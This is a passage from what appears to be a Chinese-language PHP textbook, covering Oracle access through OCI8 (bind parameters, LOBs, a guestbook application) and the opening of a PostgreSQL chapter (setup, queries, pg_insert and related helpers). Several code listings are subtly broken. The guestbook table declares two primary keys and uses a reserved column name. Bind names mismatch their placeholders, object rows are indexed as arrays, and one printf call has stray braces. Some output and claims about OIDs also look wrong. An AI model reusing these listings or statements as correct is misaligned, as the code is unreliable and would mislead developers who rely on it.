echo "Error!";
}
}
$sql = "INSERT INTO my_table (field) VALUES ('Value1')";
$command = oci_parse($db, $sql);
if (oci_execute($command, OCI_DEFAULT)) {
echo "Data entered.<br />";
} else {
echo "Error!";
}
$sql = "INSERT INTO my_table (field) VALUES ('value2')";
$command = oci_parse($db, $sql);
if (oci_execute($command, OCI_DEFAULT)) {
echo "Data entered.<br />";
} else {
echo "Error!";
}
}
if (oci_commit($db)) {
echo "Data transmitted.";
} else {
echo "Error!";
}
}
oci_close($db);
} else {
    echo "Error!";
}
?>
```

清单 22.2 表已创建并填充（“oci-query.php”）

Oracle 还支持参数化查询，这是 PHP OCI8 扩展的一项专长（PHP 的旧 Oracle 库尚未支持此功能）。为此，你在 SQL 命令中指定命名占位符，占位符必须以冒号开头：

```
INSERT INTO my_table (field) VALUES (:value)
```

使用 `oci_bind_by_name()` 函数，你现在可以将值绑定到这些占位符——先是占位符的名称，然后是值：

```
oci_bind_by_name($command, ":value", "The actual value");
```

以下完整清单演示了此过程。

```php
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql = "INSERT INTO my_table (field) VALUES (:value)";
    $command = oci_parse($db, $sql);
    oci_bind_by_name($command, ":value", "value3");
    if (oci_execute($command)) {
        echo "Data entered.<br />";
    } else {
        echo "Error!";
    }
    oci_close($db);
} else {
    echo "Error!";
}
?>
```

清单 22.3 通过占位符填充数据库（“oci-query-placeholder.php”）

### 22.2.3 返回值

要从数据库读取数据，同样有几种方法。`oci_result()` 函数的工作方式与其他数据库系统的可比 PHP 函数类似：你将句柄（此处为由 `oci_parse()` 预处理的 SQL 命令）作为第一个参数，将字段名作为第二个参数。³ 如果结果列表中仍有行，则 `oci_fetch()` 返回值 `true`，否则返回 `false`。这是创建 `while` 循环的绝佳方式。

```php
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql = "SELECT * FROM my_table";
    $command = oci_parse($db, $sql);
    if (oci_execute($command)) {
        echo "<ul>";
        while (oci_fetch($command)) {
            echo "<li>" . htmlspecialchars(oci_result($command, "id")) .
                ": " . htmlspecialchars(oci_result($command, "field")) . "</li>";
```

3 或者列号；计数从 1 开始。这对于聚合函数（例如 `COUNT()`）很重要，否则你将不得不使用别名（`SELECT COUNT(*) AS number FROM table`）。





}
echo "</ul>";
}
oci_close($db);
} else {
echo "Error!";
}
?>

## 清单 22.4 读取表内容 ("oci-read.php")

然而，这会为每个字段创建一次单独的（从性能角度来看）开销较大的函数调用。更好的做法是直接获取结果列表的完整当前行。使用 oci_fetch_assoc()，这以关联数组的形式完成。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
$sql = "SELECT * FROM my_table";
$command = oci_parse($db, $sql);
if (oci_execute($command)) {
echo "<ul>";
while ($row = oci_fetch_assoc($command)) {
echo "<li>" . htmlspecialchars($row["id"]) .
": " . htmlspecialchars($row["field"]) . "</li>";
}
echo "</ul>";
}
oci_close($db);
} else {
echo "Error!";
}
?>
```

## 清单 22.5 通过关联数组读取 ("oci-read-associative.php")

另一方面，oci_fetch_object() 函数将行作为对象返回，列名作为对象属性。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
$sql = "SELECT * FROM my_table";
$command = oci_parse($db, $sql);
if (oci_execute($command)) {
echo "<ul>";
while ($row = oci_fetch_object($command)) {
echo "<li>" . htmlspecialchars($row->id) .
": " . htmlspecialchars($row["field"]) . "</li>";
}
echo "</ul>";
}
oci_close($db);
} else {
    echo "Error!";
}
?>
```

## 清单 22.6 通过对象读取 ("oci-read-object.php")

最后但同样重要的是，还有一次性读取完整结果列表的选项，尽管这仅推荐用于相对较小的返回数据量。相应的函数称为 `oci_fetch_all()`，并期望五个参数：

- 1. 由 `oci_parse()` 创建的命令对象
- 2. 返回数据的数组
- 3. 应跳过的行数（0 表示使用所有行）
- 4. 要返回的最大行数（-1 表示返回所有行）
- 5. 返回值的类型，例如 `OCI_NUM`（带数字索引的数组）或 `OCI_ASSOC`（关联数组）

最后三个参数是可选的。

在以下完整清单中，与之前代码示例相比的特殊功能以粗体突出显示。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql = "SELECT * FROM my_table";
    $command = oci_parse($db, $sql);
    if (oci_execute($command)) {
        oci_fetch_all($command, $all, 0, -1, OCI_ASSOC);
        echo "<ul>";
        foreach ($all as $row) {
            echo "<li>" . htmlspecialchars($row["id"]) .
                ": " . htmlspecialchars($row["field"]) . "</li>" ;
        }
        echo "</ul>";
        oci_close($db);
    } else {
        echo "Error!";
    }
} ?>
```

## 清单 22.7 一次性读取所有数据 ("oci-read-all.php")

### 22.2.4 特殊功能

Oracle 是一个功能非常强大的数据库，具有许多特殊功能。这里突出介绍了一些特别有趣的功能。

### 最后插入的自动值

如前所述，Oracle 中实际上没有自动值。但是，可以通过序列来解决这个问题。这里我们使用了 NEXTVAL 来获取序列的下一个值（同时使序列增加 1）。CURRVAL 将给出序列的当前值。因此，如果向数据库插入一些内容，然后读取 CURRVAL，即可确定最后插入的自动值（参见图 22.5）。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql1 = "INSERT INTO my_table (field) VALUES (:value)";
    $command1 = oci_parse($db, $sql1);
    oci_bind_by_name($command1, ":value", "value4");
    if (oci_execute($command1, OCI_DEFAULT)) {
        $sql2 = "SELECT my_table_id.CURRVAL AS id FROM DUAL";
        $command2 = oci_parse($db, $sql2);
        if (oci_execute($command2, OCI_DEFAULT)) {
            oci_fetch($command2);
            $id = oci_result($command2, "id");
        } else {
            $id = "?";
            echo "Error!";
        }
        echo "Data entered with ID $id.";
    } else {
        echo "Error!";
    }
    oci_commit($db);
    oci_close($db);
} else {
    echo "Error!";
}
?>
```

## 清单 22.8 读取最后一个自动值 ("oci-read-autovalue.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_650_0.png)

图 22.5 新数据库条目的 ID

### 使用 LOB

PHP 的 OCI8 扩展取代了旧的 ORA 模块，因为它现在也支持大对象 (LOB) 和二进制大对象 (BLOB)。这本身就是一门学问，但作为在此进行少量实验的动力，值得研究一个允许将文件存储在数据库中的小示例。oci_new_descriptor() 函数创建一个空 LOB 变量。这提供了两个有趣的方法：

- 1. load() 从 LOB 加载数据。
- 2. save() 将数据保存到 LOB 中。

在清单 22.9 中，您可以看到将自身保存到数据库中的代码；表中的数据字段类型为 LOB。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $lob = oci_new_descriptor($db, OCI_D_LOB);
    $sql = "INSERT INTO my_table (field, data) VALUES
        ('LOB', EMPTY_BLOB())
        RETURNING data INTO :lobdata";
    $command = oci_parse($db, $sql);
    oci_bind_by_name($command, ":lobdata", $lob, -1, OCI_B_BLOB);
    if (oci_execute($command, OCI_DEFAULT) &&
        $lob->save(file_get_contents("oci-lob-store.php")) &&
        oci_execute($command, OCI_COMMIT_ON_SUCCESS)) {
        echo "Data entered.<br />";
    } else {
        echo "Error!";
    }
    oci_close($db);
} else {
    echo "Error!";
}
?>
```

## 清单 22.9 在数据库中存储 LOB ("oci-lob-store.php")

> 注意
> 
> 请注意，您需要调用 oci_execute() 两次：一次用于创建 LOB，第二次在使用 $lob->save() 传输数据之后。

读取过程非常相似。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql = "SELECT data FROM my_table WHERE field = 'LOB'";
    $command = oci_parse($db, $sql);
if (oci_execute($command) && oci_fetch($command)) {
    $lobdata = oci_result($command, "data");
    echo "<xmp>" .
    nl2br(htmlspecialchars($lobdata->load())) .
    "</xmp>";
} else {
    echo "Error!";
}
oci_close($db);
} else {
    echo "Error!";
}
?>
```

## 清单 22.10 从数据库读取 LOB ("oci-lob-read.php")

## 22.3 应用示例

Oracle 有其专有特性，就像其他数据类型和序列一样。这些特性体现在经过验证的标准留言本示例中，我们已将其移植到 OCI8 扩展。

### 22.3.1 创建表

创建表时，我们需要一个新序列和相应的 INSERT 触发器。为了不必为日期字段的不同语言设置而烦恼，我们将其声明为数字字段，并稍后以 Unix 纪元格式写入当前时间戳。

```
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    $sql = "CREATE TABLE guestbook (
    id NUMBER(10) PRIMARY KEY,
    heading VARCHAR2(1000),
    entry VARCHAR2(5000),
    author VARCHAR2(50),
    email VARCHAR2(100),
    date NUMBER(20) PRIMARY KEY
    );
CREATE SEQUENCE guestbook_id;
CREATE TRIGGER guestbook_autoincrement BEFORE INSERT ON guestbook
REFERENCING NEW AS NEW OLD AS OLD FOR EACH ROW BEGIN
SELECT guestbook_id.NEXTVAL INTO :NEW.id FROM DUAL;
END;";
$command = oci_parse($db, $sql);
if (oci_execute($command)) {
    echo "Table created.<br />";
} else {
    echo "Error!";
}
oci_close($db);
} else {
    echo "Error!";
}
?>
```

## 清单 22.11 表已创建 ("gb-create.php")

### 22.3.2 输入数据

将数据写入数据库的工作方式与往常相同。表单数据通过 oci_bind_by_name() 作为命名参数绑定到 SQL 命令。

插入的数据记录的 ID 使用 guestbook_id.CURRVAL 读取，并同时输出以供演示。在生产系统中，只有当用于编辑的 PHP 脚本经过特殊访问保护时，这才有用。

请勿忘记：调用 oci_execute() 时不要使用默认模式，而应显式指定 OCI_DEFAULT。您还需要在脚本末尾调用 oci_commit()。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
    isset($_POST["Email"]) &&
    isset($_POST["Heading"]) &&
    isset($_POST["Comment"])) {
if ($db = oci_connect("user", "password", "orcl")) {
$sql = "INSERT INTO guestbook
(heading,
entry,
author,
email,
date)
VALUES (:heading, :comment, :name, :email, :date)";
```





```
$command = oci_parse($db, $sql);
oci_bind_by_name($command, ":Heading", $_POST["Heading"]);
oci_bind_by_name($command, ":Comment", $_POST["Comment"]);
oci_bind_by_name($command, ":Name", $_POST["Name"]);
oci_bind_by_name($command, ":Email", $_POST["Email"]);
oci_bind_by_name($command, ":Date", time());
if (oci_execute($command, OCI_DEFAULT)) {
  $sql_id = "SELECT guestbook_id.CURRVAL AS id FROM DUAL";
  $command_id = oci_parse($db, $sql_id);
  if (oci_execute($command_id, OCI_DEFAULT)) {
    oci_fetch($command_id);
    $id = oci_result($command_id, "id");
  } else {
    $id = "";
    echo "Error!";
  }
echo "Entry added.
<a href=\"gb-admin?id=$id\">Edit</a>";
} else {
echo "Error!";
}
oci_commit($db);
oci_close($db);
} else {
echo "Error!";
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /><br />
Email address <input type="text" name="Email" /><br />
Heading <input type="text" name="Heading" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

### 清单 22.12 可以输入数据（“gb-enter.php”)

### 22.3.3 输出数据

再次读出留言本同样容易实现。由于日期字段是数值型，且较晚的日期也具有更大的值，按此字段排序可确保条目按逆时间顺序输出。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if ($db = oci_connect("user", "password", "orcl")) {
$sql = "SELECT * FROM guestbook ORDER BY date DESC";
$command = oci_parse($db, $sql);
if (oci_execute($command)) {
while ($row = oci_fetch_object($command)) {
printf("<p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
<h3>%s</h3><p><hr noshade=\"\" />",
urlencode($row->email),
htmlspecialchars($row->author),
htmlspecialchars(date("Y-m-d, H:i", intval($row->date))),
htmlspecialchars($row->heading),
nl2br(htmlspecialchars($row->entry)))
});
}
}
oci_close($db);
} else {
echo "Error!";
}
?>
</body>
</html>
```

### 清单 22.13 输出留言本数据（“gb-show.php”)

### 22.3.4 删除数据

gb-admin.php 脚本列出所有留言本条目，并允许通过鼠标点击删除（准确地说，需要点击两下）。此外，每个条目都链接到 gb-edit.php（如第 22.3.5 节所述），可用于编辑该条目。

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
    if (isset($_GET["ok"])) {
        if ($db = oci_connect("user", "password", "orcl")) {
            $sql = "DELETE FROM guestbook WHERE id=:id";
            $command = oci_parse($db, $sql);
            oci_bind_by_name($command, ":id", intval($_GET["id"]));
            if (oci_execute($command)) {
                echo "<p>Entry deleted.</p>
                <p><a href=\"gb-admin.php\">Back to overview
                </a></p>";
            } else {
                echo "Error!";
            }
            oci_close($db);
        } else {
            echo "Error!";
        }
    } else {
        printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?
        </a>", urlencode($_GET["id"]));
    }
} else {
    if ($db = oci_connect("user", "password", "orcl")) {
        $sql = "SELECT * FROM guestbook ORDER BY date DESC";
        $command = oci_parse($db, $sql);
        if (oci_execute($command)) {
            while ($row = oci_fetch_object($command)) {
                printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this entry</a>
                - <a href=\"gb-edit.php?id=%s\">Edit this entry</a></b></p>
                <p><a href=\"mailto:%s\">%s</a> wrote on at %s:</p>
                <h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
                urlencode($row->id),
                urlencode($row->id),
                htmlspecialchars($row->email),
                htmlspecialchars($row->author),
                htmlspecialchars(date("Y-m-d, H:i", intval($row->date))),
                htmlspecialchars($row->heading),
                nl2br(htmlspecialchars($row->entry))
                );
            }
        }
        oci_close($db);
    } else {
        echo "Error!";
    }
}
}
?>
</body>
</html>
```

### 清单 22.14 带删除选项的所有数据显示（“gb-admin.php”)

### 22.3.5 编辑数据

编辑数据时，同时展示了两种技术：首先是读出数据并正确预填充关联的表单字段，其次是使用带命名参数的 UPDATE 命令将更改写回数据库。这可作为本章的精彩收官！

```
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";
if (isset($_GET["id"]) &&
is_numeric($_GET["id"])) {
if ($db = oci_connect("user", "password", "orcl")) {
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
$sql = "UPDATE guestbook SET
heading = :heading,
entry = :comment,
author = :name,
email = :Email
WHERE id=:id";
$command = oci_parse($db, $sql);
oci_bind_by_name($command, ":Heading", $_POST["Heading"]);
oci_bind_by_name($command, ":Comment", $_POST["Comment"]);
oci_bind_by_name($command, ":Name", $_POST["Name"]);
oci_bind_by_name($command, ":Email", $_POST["Email"]);
oci_bind_by_name($command, ":id", intval($_GET["id"]));
if (oci_execute($command)) {
echo "<p> Entry changed.</p>
     <p><a href=\"gb-admin.php\">Back to overview
     </a></p>";
} else {
    echo "Error!";
}
}
$sql = "SELECT * FROM guestbook WHERE id=:id";
$command = oci_parse($db, $sql);
oci_bind_by_name($command, ":id", intval($_GET["id"]));
if (oci_execute($command)) {
    if ($row = oci_fetch_object($command)) {
        $Name = $row->author;
        $Email = $row->email;
        $Heading = $row->heading;
        $Comment = $row->entry;
    }
}
oci_close($db);
} else {
    echo "Error!";
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php
echo htmlspecialchars($Name);
?>" /><br />
Email address <input type="text" name="Email" value="<?php
echo htmlspecialchars($Email);
?>" /><br />
Heading <input type="text" name="Heading" value="<?php
echo htmlspecialchars($Heading);
?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php
echo htmlspecialchars($Comment);
?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

### 清单 22.15 编辑留言本条目（“gb-edit.php”)

# 第 23 章

# PostgreSQL

另一种流行的开源数据库是 PostgreSQL。因此，PHP 提供相应的扩展来访问它，这也不足为奇。

PostgreSQL 数据库（www.postgresql.org）最初由加州大学伯克利分校开发。该软件获得了认可，但成功只有在源代码作为开源发布后才到来。

许多开发者对 PostgreSQL 避之不及，因为它据称不稳定且容易导致数据损坏。幸运的是，这是过时的信息；不幸的是，它只在开发者社区的脑海中缓慢消失。PostgreSQL 已发展成为一款非常出色的数据库。当然，有些方面与公认的主流数据库不同，但这绝不是排除标准。

然而，PostgreSQL 在 Windows 上的使用曾有一段时间存在问题；必须安装额外的软件包，其中一些甚至被标记为已弃用——即过时。这也已成为过去式——尽管只是最近才如此。

PostgreSQL 是一款功能强大的数据库，足以单独写一本书。与其他数据库章节一样，我们将专注于标准任务，以便你可以使用 PostgreSQL 实现项目，然后介绍该数据库的一些选定特性，以激励你继续实验。

## 23.1 准备工作

开头总是安装工作。各种操作系统的二进制版本可直接在 PostgreSQL 网站 www.postgresql.org/download 上获取。这使得安装变得轻而易举（过去并非总是如此）。不要对图形安装程序是从 https://enterprisedb.com 获得这一事实感到惊讶——这完全正确。下载安装文件并一路点击完成安装。在指定 PostgreSQL 的数据目录时，请务必确保数据库对其具有写入权限。对于 Windows 程序目录（参见图 23.1 中的默认值），情况并非自动如此。





![](img/ae7820c36e8f24c1623d26668b28e80e_660_0.png)

图 23.1 Windows 安装程序的安装选项

对于 Unix/Linux，要么有预配置的软件包，要么发行版本身就已经自带了数据库。如果你想手动设置软件，安装过程与通常情况相同。也就是说，解压下载的归档文件，然后执行神奇的三个步骤（最后一步 `make install` 需要 root 权限，当然）：

```
./configure
make
make install
```

接着是配置。首先创建一个用户，就像 Windows 安装程序所做的那样：

```
adduser postgres
```

现在在属于 postgres 用户的 PostgreSQL 目录中创建一个名为 *data* 的子目录：

```
cd /usr/local/pgsql
mkdir data
chown postgres data
```

然后以 postgres 用户身份登录，并使用以下命令初始化 PostgreSQL：

```
/usr/local/pgsql/bin/initdb -D /usr/local/pgsql/data
```

如果上述操作成功，你可以启动 `postmaster` 程序，即实际的 PostgreSQL 守护进程。具体做法如下：

```
/usr/local/pgsql/bin/postmaster -D /usr/local/pgsql/data &
```

注意

最后一步是创建代码中将使用的数据库。如果你使用的是 Unix/Linux 或 macOS，请按以下方式创建数据库：

createdb PHP

Windows 用户还有另一个选择：在 PostgreSQL 程序组中，有一个 pgAdmin 4 条目。pgAdmin 4 是一个功能强大、基于图形和 Web 的 PostgreSQL 管理工具。（它也非常适合检查 PHP 编程的结果。）你也可以用它来创建 PHP 数据库。此方法也适用于其他操作系统的用户。你可以在 www.pgadmin.org 获取 pgAdmin。

提示

还有一个用于 PostgreSQL 数据库的基于 Web 的管理程序：phpPgAdmin，最初可于 http://s-prs.co/v602233 获取。该项目沉寂了几年，但现在 GitHub 上有一个更新的版本（新管理下）。你可以在那里找到它：http://s-prs.co/v602234。然而，使用 pgAdmin 4 可能更好，因为它维护得更加积极（见图 23.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_661_0.png)

图 23.2 新数据库在 pgAdmin 4 中方便地创建

其余所有操作都直接在 PHP 代码中完成。说到 PHP，当然也必须告知它要支持 PostgreSQL。在 Windows 上，这是通过在 php.ini 文件中添加一个简单条目来完成的：

```
extension=pgsql
```

如果你自己编译 PHP，请使用 --with-pgsql=/path/to/pgsql 开关进行配置，然后重新编译。接下来是必不可少的步骤：查看 phpinfo() 的输出，确认安装是否成功。你可能会收到类似图 23.3 中所示的消息。在 Windows 上可能的原因是：PostgreSQL 扩展需要 libpq.dll 库，该库位于 PHP 目录中。在某些系统上，该 DLL 必须位于系统路径中才能被找到。到这一步最迟，你应该会看到如图 23.4 所示的屏幕：扩展已设置。

![](img/ae7820c36e8f24c1623d26668b28e80e_662_0.png)

图 23.3 未找到 DLL（尚未找到）

![](img/ae7820c36e8f24c1623d26668b28e80e_662_1.png)

图 23.4 PostgreSQL 扩展已成功安装

## 23.2 使用 PostgreSQL 进行数据库访问

数据库名称可能不同，工作方式也与之前的不同，但相关任务始终相同：建立连接、发送 SQL 命令和查询返回值。值得庆幸的是，函数名称也相似。

### 23.2.1 连接设置

用于连接 PostgreSQL 数据库的函数名为 pg_connect()（或 pg_pconnect(), 其中 p 代表 persistent）。所有 PHP PostgreSQL 函数都以前缀 pg_- 开头。你将连接字符串作为参数指定。有许多可能性；这里你可以看到一个包含大量信息（以及不安全密码）的版本：

```
"host=localhost port=5432 dbname=PHP user=postgres password=pwd."
```

因此，你指定服务器、端口、数据库名称和用户数据。1 服务器和端口按默认值指定，因此在某些情况下可以省略。pg_connect() 函数返回一个连接句柄，如果出错则返回 false。使用 pg_close() 可以再次关闭连接。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres password=pwd.")) {
    echo "Connection established successfully.";
    pg_close($db);
} else {
    echo "Error!";
}
?>
```

清单 23.1 建立数据库连接 ("pgsql-connect.php")

> 注意
> 如果使用相同的连接字符串两次调用 pg_connect()，则不会打开新连接，而是重复使用之前的连接（并将其返回）。

### 23.2.2 查询

使用 pg_query() 向数据库发送 SQL 命令。这是在数据库中创建测试表的绝佳方法。唯一的特殊之处是（再次）自动值，在 PostgreSQL 中通过特殊数据类型 SERIAL 实现。如果出现问题，pg_last_error() 函数返回最后发生的错误文本。但是，如果 pg_connect() 发生错误，则此方法无效；在此示例中，它仅对 pg_query() 的调用有效。

1 你当然必须输入你数据库使用的数据；我们的密码不符合任何安全标准，你不应该直接使用 postgres 用户，而应该创建一个应用程序特定的用户。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
    password=pwd.")) {
    $sql = "CREATE TABLE my_table (
    id SERIAL PRIMARY KEY,
    field VARCHAR(255)
    )";
    if (pg_query($db, $sql)) {
        echo "Table created.<br />";
    } else {
        echo "Error: " . pg_last_error() . "!";
    }
    $sql = "INSERT INTO my_table (field) VALUES ('value1')";
    if (pg_query($db, $sql)) {
        echo "Data entered.<br />";
    } else {
        echo "Error: " . pg_last_error() . "!";
    }
    $sql = "INSERT INTO my_table (field) VALUES ('value2')";
    if (pg_query($db, $sql)) {
        echo "Data entered.";
    } else {
        echo "Error: " . pg_last_error() . "!";
    }
    pg_close($db);
} else {
    echo "Error!";
}
?>
```

清单 23.2 将数据写入数据库 ("pgsql-query.php")

> 提示
> 
> PHP 的 PostgreSQL 模块还支持一个特殊的辅助函数，用于从值中释放危险的 SQL 特殊字符或正确地对其进行转义。你应该在将所有动态数据用于 SQL 命令之前使用此函数 pg_escape_string()。

例如，使用 pgAdmin 查看表。你会看到一个序列已自动创建（见图 23.5），这可能与你在 Oracle 中所见类似（另见第 22 章）。每次将序列插入表中时，它都会递增 1；新表条目的 id 字段随后会自动包含序列的当前值。这个“变通方法”用于实现自动值。

![](img/ae7820c36e8f24c1623d26668b28e80e_665_0.png)

图 23.5 自动创建的序列

### IDs 和 OIDs

当你查看表的 SQL 命令时，会注意到另一个特殊之处——不是你自己发出的命令，而是 pgAdmin 中显示的命令：

```
CREATE TABLE my_table
(
  id serial NOT NULL,
  field varchar(255),
  CONSTRAINT my_table_pkey PRIMARY KEY (id)
)
WITH OIDS;
```

首先，已集成主键约束；其次，命令以 WITH OIDS 结尾。这些是全局 PostgreSQL ID，即比自动值高一级的 ID。如果激活了 WITH OIDS，则每个表条目都有一个在数据库中唯一的 ID。你可以在 WHERE 条件中查询 OID，但不能直接读取它（因此 SELECT oid FROM my_table 不可行）。为什么这很重要？如果你想在插入操作后确定自动值，在 PostgreSQL 中这并不容易。但是，PHP 提供了一种查找相应 OID 的方法。这反过来又允许访问自动值。有关详细信息，请参阅第 23.2.4 节。在较新的 PostgreSQL 版本中，也可以停用 OID——因此请确保你的测试数据库支持 OID。





支持 OIDs，以便能够再现本章中的所有示例，或在 CREATE TABLE 查询中添加 WITH OIDS。

OIDs 还承担另一个目的；即，它们还可以引用数据库中的对象。有关此信息，也可以在 23.2.4 节中找到，并附有示例。

### 23.2.3 返回值

pg_query() 的返回值是一个结果指针——即对结果列表的引用。通常，你希望逐行处理它：读取当前行，对其进行处理，然后将结果指针移到下一行。一种可能性是使用关联数组。pg_fetch_assoc() 函数将结果列表中当前行的内容作为关联数组返回；因此，while 循环可以输出完整的表内容。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {

$sql = "SELECT * FROM my_table";
if ($result = pg_query($db, $sql)) {
echo "<ul>";
while ($row = pg_fetch_assoc($result)) {
echo "<li>" . htmlspecialchars($row["id"]) .
": " . htmlspecialchars($row["field"]) . "</li>";
}
echo "</ul>";
}
pg_close($db);
} else {
echo "Error!";
}
?>
```

### 列表 23.3 每个关联数组的所有表数据 ("pgsql-read-associative.php")

与此相对的是 pg_fetch_object()，它将结果行作为具有列名作为属性的对象返回。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {

$sql = "SELECT * FROM my_table";
if ($result = pg_query($db, $sql)) {
echo "<ul>";
while ($row = pg_fetch_object($result)) {
echo "<li>" . htmlspecialchars($row->id) .
 ": " . htmlspecialchars($row["field"]) . "</li>";
 }
 echo "</ul>";
 }
 pg_close($db);
 } else {
 echo "Error!";
 }
 ?>
```

### 列表 23.4 每个对象的所有表数据 ("pgsql-read-object.php")

或者，你也可以使用数值访问，因为 pg_fetch_row() 返回一个包含所有行数据的数值数组。与所有数组一样，编号从 0 开始。这对于 SUM() 或 COUNT() 等 SQL 函数非常实用，因为你在那里没有列名，除非使用别名。

非常实用，但在资源方面并不经济的是 pg_fetch_all()，正如其名称所示，它返回完整的结果列表。对示例中“SELECT *”查询的结果调用 var_dump() 将返回以下结果：

```
array(2) {
 [0]=>
 array(2)
 {
 ["id"]=>
 string(1) "1"
 string(5) "value1"
 }
 [1]=>
 array(2)
 {
 ["id"]=>
 string(1) "2"
 string(5) "value2"
 }
 }
```

因此，它是一个数组的数组，你可以使用 foreach 将其以表格形式或列表形式输出。

```php
<?php
 if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
 password=pwd.")) {
 $sql = "SELECT * FROM my_table";
if ($result = pg_query($db, $sql)) {
    $all = pg_fetch_all($result);
    echo "<ul>";
    foreach ($all as $row) {
        echo "<li>" . htmlspecialchars($row["id"]) .
            ": " . htmlspecialchars($row["field"]) . "</li>" ;
    }
    echo "</ul>";
}

pg_close($db);
} else {
    echo "Error!";
}
?>
```

### 列表 23.5 一次性获取所有表内容 ("pgsql-read-all.php")

### 23.2.4 特殊功能

PHP 的 PostgreSQL 模块提供了许多特殊功能，此处只能介绍其中一部分。

### 最后插入的自动值

老问题：如果表具有一个自动值（或者在 PostgreSQL 中，是带有自动创建序列的 SERIAL 数据类型），那么当然很想知道新创建的值的 ID 是什么。有两种方法可以做到这一点：

- 使用 SELECT 命令查询序列的 CURRVAL 属性。
- 确定 oid，然后从此确定自动值（使用 SELECT）。

我们展示第二种方法。方便的是，pg_last_oid() 函数返回最后一次查询的 oid 值（pg_query() 的返回值作为参数传递）。以下代码示例将值插入测试表并确定相应的 ID。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
    password=pwd.")) {
$sql = "INSERT INTO my_table (field) VALUES ('value3')";
if ($result = pg_query($db, $sql)) {
$oid = pg_last_oid($result);
$result = pg_query($db,
    "SELECT id FROM my_table WHERE oid=$oid");
$row = pg_fetch_row($result);
$id = $row[0];
echo "Entry with ID $id added.";
} else {
echo "Error: " . pg_last_error() . "!";
}
pg_close($db);
} else {
echo "Error!";
}
?>
```

### 列表 23.6 确定上一条目的自动值 ("pgsql-read-autovalue.php")

### 无需 SQL 的 PostgreSQL

说实话：使用数据库（尤其是 PostgreSQL）时最乏味的部分是为简单的重复任务创建简单的 SQL 命令。但有一种潜在的补救方法。pg_insert() 函数将数据插入表中。你将数据指定为关联数组，就像你从 pg_fetch_assoc() 所期望的那样。这使得例如输入表单数据变得轻而易举。特殊字符也会自动编码。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
$data = ["field" => "value4"];
if (pg_insert($db, "my_table", $data)) {
echo "Data entered.";
} else {
echo "Error: " . pg_last_error() . "!";
}
} else {
echo "Error!";
}
?>
```

### 列表 23.7 轻松插入数据 ("pgsql-insert.php")

但这还不是全部。还可以更新数据。WHERE 条件也作为数组指定。数组包含字段名作为键和作为必须满足的条件的值（因此只能进行等量比较）。以下示例将“Value3”条目重命名为“Value4”。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
password=pwd.")) {
$data = ["field" => "value4"];
$condition = ["field" => "value3"];
if (pg_update($db, "my_table", $data, $condition)) {
echo "Data updated.";
} else {
 echo "Error: " . pg_last_error() . "!";
} } else {
 echo "Error!";
}
?>
```

### 列表 23.8 轻松更新数据 ("pgsql-update.php")

如果 UPDATE 工作，那么 SELECT 也会工作。这里你也将条件指定为数组。现在有两个条目在 field 列中具有“value4”值。这也由以下列表的输出证实，你可以在图 23.6 中看到。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
        password=pwd.")) {
$condition = ["field" => "value4"];
if ($data = pg_select($db, "my_table", $condition)) {
echo "<table><tr><th>id</th><th>field</th></tr>";
foreach ($data as $row) {
printf("<tr><td>%s</td><td>%s</td></tr>",
htmlspecialchars($row["id"]),
htmlspecialchars($row["field"]));
}
echo "</table>";
} else {
echo "Error: " . pg_last_error() . "!";
}
} else {
echo "Error!";
}
?>
```

### 列表 23.9 轻松读取数据 ("pgsql-select.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_670_0.png)

### 图 23.6 有两个数据集满足条件

而且，最后但同样重要的是，第四个重要的 SQL 语句：DELETE。过程相同：以数组形式指定条件，相关数据将从表中删除。

```php
<?php
if ($db = pg_connect("host=localhost port=5432 dbname=PHP user=postgres
                password=pwd.")) {
    $condition = ["field" => "value4"];
    if (pg_delete($db, "my_table", $condition)) {
        echo "Data deleted.";
    } else {
        echo "Error: " . pg_last_error() . "!";
    }
} else {
    echo "Error!";
}
?>
```

### 列表 23.10 轻松删除数据 ("pgsql-delete.php")

## 在 PostgreSQL 中存储文件

